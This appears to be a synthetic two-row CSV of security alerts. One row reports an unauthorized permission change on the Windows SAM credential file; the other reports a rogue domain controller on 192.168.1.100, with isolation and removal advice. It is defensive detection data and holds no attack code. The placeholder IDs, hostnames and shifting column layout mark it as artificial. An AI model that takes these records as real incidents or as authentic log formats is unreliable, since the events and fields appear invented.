9039r9fj,detect,2023-03-10T13:00:00Z,file_permission_modification,A file or directory permission was modified by an unauthorized user or process.,medium,,,,{'hostname': 'workstation01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized file permission change'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'file_path': 'C:\\Windows\\system32\\config\\SAM', 'target_user': 'SYSTEM', 'original_permissions': 'Full Control', 'new_permissions': 'Read-only'}",,
12345,threat detection,2023-03-10T16:15:00Z,Rogue Domain Controller,An unauthorized domain controller has been detected on the network.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Critical,,hostname123,,CrowdStrike Falcon,Isolate the affected host and investigate the nature and purpose of the rogue domain controller. Remove the unauthorized domain controller and remediate any affected systems.,,Persistence,Rogue Domain Controller,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,dc1.malicious.local
